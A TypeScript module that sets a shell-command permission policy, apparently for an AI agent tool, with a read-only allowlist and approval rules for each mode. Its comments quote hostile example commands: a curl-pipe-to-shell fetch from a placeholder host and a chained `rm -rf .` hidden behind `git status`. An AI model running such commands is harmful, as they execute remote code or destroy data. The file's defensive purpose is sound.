import { isDangerousCommand } from "./dangerous-command.js";

export type PolicyResult = "allow" | "deny" | "require_approval";

/**
 * Commands that only report on things.
 *
 * "ask" mode allowed every command that was not on the dangerous denylist, so
 * it never confirmed a shell command at all — `curl http://x | sh` ran without
 * a prompt, and so did `npm install <anything>` and `python deploy.py`. A
 * denylist cannot enumerate the ways to run arbitrary code; asking is the
 * point of the mode.
 *
 * So the question becomes "is this obviously read-only", and anything else is
 * confirmed. Small on purpose: the cost of omitting a safe command is one
 * extra prompt, and the cost of including an unsafe one is silent execution.
 */
const READ_ONLY_COMMANDS: ReadonlyArray<RegExp> = [
  /^ls(\s|$)/, /^pwd$/, /^whoami$/, /^date$/, /^echo\s/,
  /^cat\s/, /^head\s/, /^tail\s/, /^wc\s/, /^file\s/, /^stat\s/,
  /^which\s/, /^type\s/, /^env$/, /^printenv$/,
  // Version probes: the near-universal "is this installed" call.
  /^\S+\s+(--version|-v|-V|--help|-h)$/,
  // Git queries. Anything that writes — add, commit, push, checkout, reset —
  // is deliberately absent.
  /^git\s+(status|log|diff|show|branch|remote|config\s+--get|rev-parse|describe|blame)(\s|$)/,
  // Package managers: listing and auditing only, never install or run.
  /^(npm|pnpm|yarn)\s+(ls|list|view|outdated|audit)(\s|$)/,
  /^pip\s+(list|show|freeze)(\s|$)/,
];

/** True when a command only inspects, and can run without confirmation. */
export function isReadOnlyCommand(command: string): boolean {
  const c = command.trim();
  // A pipeline, redirect, or chain can smuggle anything past a prefix match:
  // `git status && rm -rf .` starts with an allowed command. Judge only
  // single, unchained commands; everything else is confirmed.
  if (/[|;&><`$(]/.test(c)) return false;
  return READ_ONLY_COMMANDS.some((re) => re.test(c));
}

export function evaluateCommandPolicy(
  command: string,
  mode: "ask" | "auto" | "deny" | "plan",
): PolicyResult {
  // Plan mode is read-only. checkPermission already refuses shell commands
  // before reaching here, but a policy that silently allowed them if the order
  // ever changed is the kind of gap that only shows up in production.
  if (mode === "plan") return "deny";
  if (isDangerousCommand(command)) return mode === "auto" ? "deny" : "require_approval";
  if (mode === "deny") return "deny";

  // Auto was chosen to stop being asked, so it still runs anything not on the
  // dangerous list. Ask confirms whatever is not plainly a read.
  if (mode === "ask" && !isReadOnlyCommand(command)) return "require_approval";
  return "allow";
}
